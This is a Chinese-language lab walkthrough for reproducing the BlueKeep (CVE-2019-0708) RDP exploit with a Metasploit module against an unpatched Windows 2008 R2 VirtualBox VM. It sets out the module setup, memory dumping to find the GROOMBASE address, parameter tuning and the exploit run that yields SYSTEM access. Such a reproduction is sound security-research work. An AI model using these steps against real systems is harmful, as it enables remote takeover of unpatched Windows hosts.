1、背景

BlueKeep是微软RDP服务中导致远程命令执行的严重漏洞，由于该漏洞可像蠕虫一样进行传播，因此被划分到和MS17-010，MS08-067一类中，引起了广大安全社区的关注。

zerosum0x0在github上提交了BlueKeep(CVE-2019-0708)利用模块的合并申请，Rapid7团队也发布了该模块的分析文章。

    目前该exp模块尚未整合到Metaspolit分支中（仍为合并申请状态），并且只针对64位的Windows 2008 R2和Windows7 SP1。由于模块利用需要用户提供目标机器的额外信息，否则会导致蓝屏，因此该模块被标记为手动利用模块。


2、准备

模拟环境中需要准备以下内容：

VirtualBox 6来搭载目标Windows虚拟机

旧版本的64位Windows 2008 R2镜像文件（虚拟机中最后安装的补丁为KB2888049和KB976902）

一台安装Metasploit的Linux机器


3、在 Metasploit 中安装 BlueKeep 的利用模块

在Linux机器上，首先安装Metasploit：

$git clone https://github.com/rapid7/metasploit-framework.git$ cd metasploit-framework

    然后找到BlueKeep模块的合并申请

$git fetch origin pull/12283/head:bluekeep$ git checkout bluekeep

    然后安装Metasploit所需的依赖

$gem install bundler && bundle

    在这一步中可能会遇到报错：


An error occurred while installing pg (0.21.0), and Bundler cannotcontinue. Make sure that `gem install pg -v '0.21.0' --source'https://rubygems.org/'` succeeds before Bundling.

    此时需要安装PostgreSQL的库来修复这个报错

apt-getinstall libpq-dev

    另一个遇到的报错是：

An error occurred while installing pcaprub (0.13.0), and Bundlercannot continue. Make sure that `gem install pcaprub -v '0.13.0' --source'https://rubygems.org/'` succeeds before bundling.

    修复方法是

apt-getinstall libpcap-dev

    到这里为止Metasploit依赖已经全部安装好，能够通过以下指令调用BlueKeep模块了

$./msfconsolemsf5 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce


4、设置目标机器

目标机器是安装VirtualBox 6上的旧版本64位Windows 2008 R2。

下图为systeminfo的截图。

    目标机器的配置如下：2GB内存、1核CPU、30G硬盘

   EXP中注明了Windows Server 2008需要修改注册表中的HKLM\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\ WinStations\\RDP-Tcp\\fDisableCam值为0，从而开启RDPSND通道，使模块利用成功。需要注意注册表中的默认配置不为0，因此默认安装的机器无法被攻击利用。

利用过程中导致了系统蓝屏，而非获取了一个Shell。


5、调整BlueKeep的利用模块（GROOMBASE）

蓝屏文字表明出现了PageFault（内存页报错）的问题，也就是说我们设置的内存地址存在问题。

    模块的利用需要提供正确的GROOMBASE值，也就是Non Paged Pool（NPP）的开始地址。所以我们需要手动从目标机器的内存镜像中提取NPP地址。

提取目标机器的内存镜像

    在windows宿主机中可以直接使用以下命令来获取VirtualBox中运行着的Windows系统内存镜像。

cmd>C:\Program Files\Oracle\VirtualBox\VBoxManage.exe debugvm "vm_name"dumpvmcore --filename=vm.memdump

    如果是Linux宿主机上的VirtualBox，可以使用以下命令：

$VBoxManage debugvm <uuid|vmname> dumpvmcore [--filename=name]

    备注：免费版的VMWare Workstation Player 15不支持提取内存镜像，所以这里推荐使用VirtualBox。

提取NPP地址

    这里使用rekall的Docker容器来提取NPP地址，首先是在宿主机上安装rekall的Docker镜像：

$docker pull remnux/rekall

    然后将内存镜像复制到根目录下，让Docker容器可以访问到，因此需要在Docker中运行以下命令：

$ cp dump_location/vm.memdump ~/bluekeep$ docker run --rm -it -v ~/bluekeep:/home/nonroot/filesremnux/rekall bash

    然后在rekall中运行

$rekall -f files/dump_blue.memdump pools

    输出内容应该类似以下截图

    这里给出了虚拟机NPP的起始地址，也就需要替换Exp中GROOMBASE的值。

修改利用模块

    利用模块的代码位于is located in modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb中，我们需要在VirtualBox 6部分中修改GROOMBASE变量的内容，将它替换成刚才提取到的NPP起始地址。之前提取到的地址是0xfa8001804000。

    现在运行以下指令来重新加载Metasploit模块

msf5 > reload_all


6、运行BlueKeep利用模块

现在我们在Metasploit界面中配置模块。

首先调整GROOMSIZE的值为50，这个值与虚拟机的内存大小有关，在我们的过程中该值可以成功利用。

 msf5>set GROOMSIZE 50

其他的就是常规参数 (RHOSTS,PAYLOAD,LHOST) 的设置，如下图所示

备注：带有RDP_*的参数不需要都配置，它们不影响这个模块的利用。

    运行set target 2来选择虚拟机中的目标系统，然后运行check命令和exploit命令

    如图所示，这个利用模块可以提供给攻击者一个 NT AUTHORITY / SYSTEM 权限来远程执行任意命令，该权限也是Windows机器本地系统账户中最高的权限。
